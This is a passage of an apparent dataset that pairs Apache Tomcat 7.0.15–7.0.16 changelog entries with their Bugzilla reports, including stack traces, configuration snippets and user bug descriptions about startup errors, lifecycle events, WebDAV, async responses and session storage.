[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:882) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:317) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89) 
[2011-06-07 11:07:17.750] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5081) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:122) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247) 
[2011-06-07 11:07:17.751] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at java.lang.Thread.run(Thread.java:619) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        Caused by: java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at org.apache.catalina.startup.SetSessionConfig.begin(WebRuleSet.java:722) 
[2011-06-07 11:07:17.752] ERROR start-signalling-4           System.err                                                        	at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1282) 
[2011-06-07 11:07:17.753] ERROR start-signalling-4           System.err                                                        	... 33 more 
[2011-06-07 11:07:17.753] ERROR start-signalling-4           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.catalina.startup.ContextConfig parseWebXml 
[2011-06-07 11:07:17.753] ERROR start-signalling-4           System.err                                                        SEVERE: Occurred at line 468 column 21 
[2011-06-07 11:07:17.759] ERROR start-signalling-1           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.tomcat.util.digester.Digester startElement 
[2011-06-07 11:07:17.759] ERROR start-signalling-1           System.err                                                        SEVERE: Begin event threw exception 
[2011-06-07 11:07:17.760] ERROR start-signalling-1           System.err                                                        java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence 
[2011-06-07 11:07:17.760] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.SetSessionConfig.begin(WebRuleSet.java:722) 
[2011-06-07 11:07:17.760] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1282) 
[2011-06-07 11:07:17.760] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501) 
[2011-06-07 11:07:17.761] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1363) 
[2011-06-07 11:07:17.761] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755) 
[2011-06-07 11:07:17.762] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648) 
[2011-06-07 11:07:17.762] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511) 
[2011-06-07 11:07:17.763] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808) 
[2011-06-07 11:07:17.763] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737) 
[2011-06-07 11:07:17.763] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119) 
[2011-06-07 11:07:17.764] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205) 
[2011-06-07 11:07:17.764] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522) 
[2011-06-07 11:07:17.765] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1543) 
[2011-06-07 11:07:17.765] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1694) 
[2011-06-07 11:07:17.765] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1197) 
[2011-06-07 11:07:17.766] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:882) 
[2011-06-07 11:07:17.766] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:317) 
[2011-06-07 11:07:17.766] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119) 
[2011-06-07 11:07:17.767] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89) 
[2011-06-07 11:07:17.767] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5081) 
[2011-06-07 11:07:17.767] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145) 
[2011-06-07 11:07:17.768] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812) 
[2011-06-07 11:07:17.768] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787) 
[2011-06-07 11:07:17.769] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607) 
[2011-06-07 11:07:17.769] ERROR start-signalling-1           System.err                                                        	at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:122) 
[2011-06-07 11:07:17.769] ERROR start-signalling-1           System.err                                                        	at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91) 
[2011-06-07 11:07:17.770] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122) 
[2011-06-07 11:07:17.770] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247) 
[2011-06-07 11:07:17.771] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294) 
[2011-06-07 11:07:17.771] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291) 
[2011-06-07 11:07:17.772] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229) 
[2011-06-07 11:07:17.772] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143) 
[2011-06-07 11:07:17.773] ERROR start-signalling-1           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
[2011-06-07 11:07:17.773] ERROR start-signalling-1           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
[2011-06-07 11:07:17.773] ERROR start-signalling-1           System.err                                                        	at java.lang.Thread.run(Thread.java:619) 
[2011-06-07 11:07:17.775] ERROR start-signalling-1           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.catalina.startup.ContextConfig parseWebXml 
[2011-06-07 11:07:17.776] ERROR start-signalling-1           System.err                                                        SEVERE: Parse error in application web.xml file at file:/opt/users/hudsonbuild/workspace/virgo.web-server.snapshot/org.eclipse.virgo.server.smoketest/target/test-expanded/virgo-tomcat-server-3.0.0.CI-2011-06-07_11-01-11/work/org.eclipse.virgo.kernel.deployer_3.0.0.D-20110603101321/staging/global/bundle/org.eclipse.gemini.web.tomcat/2.0.0.BUILD-20110603145554/org.eclipse.gemini.web.tomcat-2.0.0.BUILD-20110603145554.jar/conf/web.xml 
[2011-06-07 11:07:17.777] ERROR start-signalling-1           System.err                                                        java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence 
[2011-06-07 11:07:17.777] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2687) 
[2011-06-07 11:07:17.777] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2713) 
[2011-06-07 11:07:17.778] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1285) 
[2011-06-07 11:07:17.778] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501) 
[2011-06-07 11:07:17.779] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1363) 
[2011-06-07 11:07:17.779] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755) 
[2011-06-07 11:07:17.780] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648) 
[2011-06-07 11:07:17.780] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511) 
[2011-06-07 11:07:17.781] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808) 
[2011-06-07 11:07:17.781] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737) 
[2011-06-07 11:07:17.781] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119) 
[2011-06-07 11:07:17.782] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205) 
[2011-06-07 11:07:17.782] ERROR start-signalling-1           System.err                                                        	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522) 
[2011-06-07 11:07:17.782] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1543) 
[2011-06-07 11:07:17.783] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1694) 
[2011-06-07 11:07:17.783] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1197) 
[2011-06-07 11:07:17.783] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:882) 
[2011-06-07 11:07:17.784] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:317) 
[2011-06-07 11:07:17.784] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119) 
[2011-06-07 11:07:17.785] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89) 
[2011-06-07 11:07:17.785] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5081) 
[2011-06-07 11:07:17.785] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145) 
[2011-06-07 11:07:17.786] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812) 
[2011-06-07 11:07:17.786] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787) 
[2011-06-07 11:07:17.786] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607) 
[2011-06-07 11:07:17.787] ERROR start-signalling-1           System.err                                                        	at org.eclipse.gemini.web.tomcat.internal.TomcatServletContainer.startWebApplication(TomcatServletContainer.java:122) 
[2011-06-07 11:07:17.787] ERROR start-signalling-1           System.err                                                        	at org.eclipse.gemini.web.internal.StandardWebApplication.start(StandardWebApplication.java:91) 
[2011-06-07 11:07:17.788] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.web.core.internal.WebBundleLifecycleListener.onStarted(WebBundleLifecycleListener.java:122) 
[2011-06-07 11:07:17.788] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.StandardArtifactStateMonitor.onStarted(StandardArtifactStateMonitor.java:247) 
[2011-06-07 11:07:17.789] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.asyncStartSucceeded(AbstractInstallArtifact.java:294) 
[2011-06-07 11:07:17.789] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact.access$0(AbstractInstallArtifact.java:291) 
[2011-06-07 11:07:17.790] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.install.artifact.internal.AbstractInstallArtifact$StateMonitorSignal.signalSuccessfulCompletion(AbstractInstallArtifact.java:229) 
[2011-06-07 11:07:17.790] ERROR start-signalling-1           System.err                                                        	at org.eclipse.virgo.kernel.core.internal.BundleStartTracker$1.run(BundleStartTracker.java:143) 
[2011-06-07 11:07:17.790] ERROR start-signalling-1           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
[2011-06-07 11:07:17.791] ERROR start-signalling-1           System.err                                                        	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
[2011-06-07 11:07:17.791] ERROR start-signalling-1           System.err                                                        	at java.lang.Thread.run(Thread.java:619) 
[2011-06-07 11:07:17.791] ERROR start-signalling-1           System.err                                                        Caused by: java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence 
[2011-06-07 11:07:17.792] ERROR start-signalling-1           System.err                                                        	at org.apache.catalina.startup.SetSessionConfig.begin(WebRuleSet.java:722) 
[2011-06-07 11:07:17.792] ERROR start-signalling-1           System.err                                                        	at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1282) 
[2011-06-07 11:07:17.792] ERROR start-signalling-1           System.err                                                        	... 33 more 
[2011-06-07 11:07:17.793] ERROR start-signalling-1           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.catalina.startup.ContextConfig parseWebXml 
[2011-06-07 11:07:17.793] ERROR start-signalling-1           System.err                                                        SEVERE: Occurred at line 468 column 21 
[2011-06-07 11:07:17.806] ERROR start-signalling-4           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.catalina.startup.ContextConfig configureStart 
[2011-06-07 11:07:17.806] ERROR start-signalling-4           System.err                                                        SEVERE: Marking this application unavailable due to previous error(s) 
[2011-06-07 11:07:17.808] ERROR start-signalling-1           System.err                                                        Jun 7, 2011 11:07:17 AM org.apache.catalina.startup.ContextConfig configureStart 
[2011-06-07 11:07:17.808] ERROR start-signalling-1           System.err                                                        SEVERE: Marking this application unavailable due to previous error(s) 
[2011-06-07 11:07:18.034] ERROR start-signalling-1           System.err                                                        Jun 7, 2011 11:07:18 AM org.apache.catalina.core.StandardContext startInternal 
[2011-06-07 11:07:18.035] ERROR start-signalling-1           System.err                                                        SEVERE: Error getConfigured 
[2011-06-07 11:07:18.036] ERROR start-signalling-1           System.err                                                        Jun 7, 2011 11:07:18 AM org.apache.catalina.core.StandardContext startInternal 
[2011-06-07 11:07:18.037] ERROR start-signalling-1           System.err                                                        SEVERE: Context [/org.eclipse.virgo.apps.repository] startup failed due to previous errors"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51340
Catalina|Tomcat 7.0.16 (markt)|fix|51344|Fix problem with Lifecycle re-factoring for deprecated embedded class that prevented events being triggered. (markt)|org.apache.catalina.startup.Embedded overrides Lifecycle incorrectly?|"Not sure if this is a bug or just my mis-coding...

I've been using the Embedded component in Tomcat 6.0.29 for integration testing. Something like this:

    server = new EmbeddedTomcat(""/test"", 7890, ""JVM-1"");
    PeerToPeerCacheLifecycleListener p2pListener = new PeerToPeerCacheLifecycleListener();
    p2pListener.setProperty(""mcast-port"", ""19991"");
    server.getEmbedded().addLifecycleListener(p2pListener);
    sessionManager = new DeltaSessionManager();
    server.getRootContext().setManager(sessionManager);

Here the EmbeddedTomcat class is simply a wrapper for Embedded - I'm passing in the context, port and 'JVM route' - nothing special. Then I add a listener which should be the programmatic equivalent of having the following server.xml snippet:

<Server>
    <Listener className=""PeerToPeerCacheLifecycleListener""/>
</Server>

DeltaSessionManager performs custom session management and thus extends ManagerBase and implements Lifecycle and SessionManager.

During the start of DeltaSessionManager I initialize the listener by doing

    this.lifecycle.fireLifecycleEvent(START_EVENT, null);

The listener picks up this event and starts.

All works nicely under Tomcat 6, but breaks under Tomcat 7.0.12. My initial investigation shows that the LifecycleEvent, being fired, is not reaching the Embedded component which is where the listener is registered.

Removing the overridden Lifecycle methods from Embedded (so that the Lifecyle processing happens in LifecycleBase) seems to work as the triggered event then reaches my listener."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51344
Catalina|Tomcat 7.0.16 (markt)|fix|51348|Prevent possible NPE when processing WebDAV locks. (markt)|Potential NullPointerException in org.apache.catalina.servlets.WebdavServlet at line 1336|"A WebDAV LOCK_REFRESH request may cause a NullPointerException because of an (IMHO) wrong check at line 1332 in  WebdavServlet.java 1056763 2011-01-08 18:56:57Z markt.

I suggest line 1332 should be:
...
  if (toRenew != null) {
..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51348
Coyote|Tomcat 7.0.16 (markt)|fix||When parsing the port in the HTTP host header, restrict the value to be base 10 integer digits rather than hexadecimal ones. (rjung/markt/kkolinko)|||
Coyote|Tomcat 7.0.16 (markt)|update||Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt)|||
Jasper|Tomcat 7.0.16 (markt)|update||Change JAR scanning log messages where no TLDs are found to DEBUG level and replace the multiple messages with a single INFO level message that indicates that at least one JAR was scanned needlessly and how to obtain more info. (markt)|||
Cluster|Tomcat 7.0.16 (markt)|fix||Enable Servlet 3 asynchronous processing support when using clustering. (markt)|||
Web applications|Tomcat 7.0.16 (markt)|fix||Correct the log4j configuration settings when defining conversion patterns in the documentation web application. (markt)|||
Catalina|Tomcat 7.0.15 (markt)|fix|27122|Remove a workaround for a very old and since fixed Mozilla bug and change the default value of the securePagesWithPragma attribute of the Authenticator Valves to false. These changes should reduce the likelihood of issues when downloading files with IE. (markt)|IE plugins cannot access components through Tomcat 5 over SSL|"SSL seems to be failing when the Content-Type header is set to ""image/svg+xml"".

I've only seen this failure when SSL was running on a Solaris machine.  (uname
-a: SunOS [hostname removed] 5.8 Generic_108528-18 sun4u sparc SUNW,Ultra-60) 
When attempted on Windows, we were unable to duplicate the error.  This reliably
fails when attempted on this specific Solaris machine.  If I get a chance, I'll
try to create a test-case and see if I can reproduce this on other Solaris
machines.  Unfortunately, this was a show-stopper for a release that's being
made today so I'm pressed for time.

Basically, what happens is that we're using a JSP page to create an SVG file. 
Because of this, we have to set the Content-Type header to ""image/svg+xml"". 
When the MIME type is set to this value, the page fails to load in Internet
Explorer 6 (SP1) with a message of ""connection failed"" or something similar. 
When an attempt was made in Opera, Opera responded by crashing.  Mozilla
successfully downloaded the file, though.

However, when resetting the MIME type in the page to ""text/plain"" all three
browsers can access the page without failure.  By back-revving Tomcat to version
4.1.29, we were able to resolve this issue and access the page in all three
browsers.

I'll try and create a test-case later today and verify that it isn't just our
SVG JSP that's failing but any that creates SVG but I'm currently pressed for
time - sorry."|https://bz.apache.org/bugzilla/show_bug.cgi?id=27122
Catalina|Tomcat 7.0.15 (markt)|fix|35054|Check that a file is not specified for a Host's appBase and log an error if it is. (markt)|warn if appBase is not existing as a File or directory|otherwise, it may very hard to find what is wrong|https://bz.apache.org/bugzilla/show_bug.cgi?id=35054
Catalina|Tomcat 7.0.15 (markt)|fix|51197|Fix possible dropped connection when sendError or sendRedirect are used during async processing. (markt)|sendError/sendRedirect don't work with AsyncContext|"For some reason, response.sendRedirect and response.sendError are not producing expected behavior when using an AsyncContext.  On the server side, the async request completes normally, and everything looks hunky dory, but the client never gets ANY response from the server.  It appears that Tomcat simply times out after the default 10 seconds and closes the connection.  No headers are returned, no content, nothing.  I've confirmed with thread dumps that the server isn't stuck.

Yet...if you use response.setStatus and response.setHeader instead, it works absolutely fine.  The client gets the response every time.

I put together a very simple test that isolates the issue reliably:

https://github.com/dcheckoway/async-test

See the README in there for details.

NOTE: the behavior for sendError changed slightly from 7.0.12 to 7.0.14.  As of 7.0.14, sendError seems to close the connection immediately, but the client still never gets any response of any kind."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51197
Catalina|Tomcat 7.0.15 (markt)|fix|51221|Correct Spanish translation of text used in a 302 response. Patch provided by Paco Sober√≥n. (markt)|Wrong spelling in Spanish locale|"There's a property in 
java/org/apache/tomcat/util/http/res/LocalStrings_es.properties that says:

sc.302=Movido tempor\u00e1lmente

And it should say:

sc.302=Movido temporalmente

The word ""temporalmente"" does not have an accent, as it can be checked in:

http://buscon.rae.es/draeI/SrvltConsulta?TIPO_BUS=3&LEMA=temporalmente

More information about why this is usually mispelled can be found in:

http://buscon.rae.es/dpdI/SrvltGUIBusDPD?lema=tilde2#42

Kind regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51221
Catalina|Tomcat 7.0.15 (markt)|fix|51249|"Correct ClassLoaderLogManager system property replacement code so properties of the form ""}${...}"" can be used without error. (markt)"|JULI ClassLoaderLogManager doesn't properly handle ${} when replacing property values|"when the LogManager does it's replace of ${property} it doesn't handle properly the fact that a } could exist before ${.

The indexOf for the char } should be relative to the start position of ${

Example of string : %{custom.property.matching} ${system.property.tomcat}

This would throw an exception about the index } being before ${

This is valid for all the 7.* versions as well as all the 6.* versions (validated from 6.0.27 and above).

There is not even a way to ""escape"" the ${} chars if we'd like to output them."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51249
Catalina|Tomcat 7.0.15 (markt)|fix|51264|Allow the JDBC persistent session store to use a JNDI datasource to define the database in which sessions are persisted. Patch provided by Felix Schumacher. (markt)|Context/Manager/Store configuration proposal|"Why is it the Persistent Store Store element does not contain a means to reference a database link defined in the globalnamingresources, for example:

This is what is required

<?xml version=""1.0"" encoding=""UTF-8""?>
<Context path=""/App1"" docbase="" App1"" reloadable=""false"" crossContext=""true"" debug=""1"">
    <Manager className=""org.apache.catalina.session.PersistentManager"" distributable=""true"" maxIdleBackup=""5"">
      <Store className=""org.apache.catalina.session.JDBCStore"" connectionURL=""jdbc:oracle:thin:username/password@servername:port:schema""
        driverName=""oracle.jdbc.OracleDriver"" sessionAppCol=""app_name"" sessionDataCol=""session_data"" 
        sessionIdCol=""session_id"" sessionLastAccessedCol=""last_access"" sessionMaxInactiveCol=""max_inactive""
        sessionTable=""tomcat_sessions"" sessionValidCol=""valid_session"" />
    </Manager>
    <ResourceLink global=""jdbc/dbName"" name=""jdbc/dbName"" type=""javax.sql.DataSource""/>
</Context>

BUT couldn‚Äôt the tomcat accept this?

<?xml version=""1.0"" encoding=""UTF-8""?>
<Context path=""/App1"" docbase="" App1"" reloadable=""false"" crossContext=""true"" debug=""1"">
    <Manager className=""org.apache.catalina.session.PersistentManager"" distributable=""true"" maxIdleBackup=""5"">
      <Store className=""org.apache.catalina.session.JDBCStore"" resourceLink=""jdbc/dbName""
        resourceType=""javax.sql.DataSource"" sessionAppCol=""app_name"" sessionDataCol=""session_data"" 
        sessionIdCol=""session_id"" sessionLastAccessedCol=""last_access"" sessionMaxInactiveCol=""max_inactive""
        sessionTable=""tomcat_sessions"" sessionValidCol=""valid_session"" />
    </Manager>
    <ResourceLink global=""jdbc/dbName"" name=""jdbc/dbName"" type=""javax.sql.DataSource""/>
</Context>

That way the application developer does not need to know the username and password to the production database server nor does it need to be packaged in his/her war file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51264
Catalina|Tomcat 7.0.15 (markt)|fix|51274|Add missing i18n strings in PersistentManagerBase. Patch provided by Eiji Takahashi. (markt)|Missing messages in PersistentManagerBase|"Created attachment 27074 [details]
patch for LocalStrings.properties

The following two message properties do not exist in the LocalStrings.properties. 
 persistentManager.swapInException
 persistentManager.swapInInvalid

I attached the patch for LocalStrings.properties.

regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51274
Catalina|Tomcat 7.0.15 (markt)|fix|51276|Provide an abstraction for accessing content in JARs so the most efficient method can be selected depending on the type of URL used to identify the JAR. This improves startup time when JARs are located in $CATALINA_BASE/lib. (markt)|"Startup time is too high if there are few JARs in ""lib/"" and a few webapps."|"Startup time in tomcat 7.0.14 is 10x higher than 7.0.12, if there are a few shared JARs in tomcat/lib and a few webapps.
The issue is very simple to reproduce, simply add 10 empty directories in tomcat/webapps and (for example) the Metro webservices jars in tomcat/lib. On my machine the startup time increase from 0.5 secs (default installation) to 35.2 secs.
When using tomcat 7.0.12 the startup time is about 3 secs on my machine in this test case."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51276
Catalina|Tomcat 7.0.15 (markt)|fix|51277|Improve error message if an application is deployed with an incomplete FORM authentication configuration. (markt)|NPE during the form authentication when form-login-config is missed|"Created attachment 27075 [details]
Log from a browser

Hi!
There is NPE during the form authentication when form-login-config is missed

I missed form-login-config by mistake (converted it from the BASIC):

  <login-config>
    <auth-method>FORM</auth-method>
    <realm-name>Tomcat Manager Application</realm-name>
  </login-config>
Unfortunately I get NPE (see below and attached).
I do understand that Form authentication can not work, but I think NPE is bad output.
I think better is HTTP 500.

Best regards,
   Michael


java.lang.NullPointerException
	org.apache.catalina.authenticator.FormAuthenticator.forwardToLoginPage(FormAuthenticator.java:373)
	org.apache.catalina.authenticator.FormAuthenticator.authenticate(FormAuthenticator.java:267)
	org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:539)
	org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:562)
	org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:395)
	org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:250)
	org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:188)
